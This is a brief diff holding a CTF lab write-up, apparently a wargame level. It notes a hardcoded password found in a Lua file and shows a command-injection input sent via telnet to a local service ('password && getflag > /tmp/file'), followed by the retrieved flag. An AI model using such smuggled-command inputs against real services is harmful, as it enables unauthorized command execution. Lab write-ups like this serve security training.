@@ -1,0 +1,4 @@
+Fichier .lua 
+f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 => hardcoded passed => NotSoEasy 
+We see a echo line command so we telnet 127.0.0.1 5151 and we use « f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 && getflag > /tmp/file « 
+cat tmp/file => fa6v5ateaw21peobuub8ipe6s
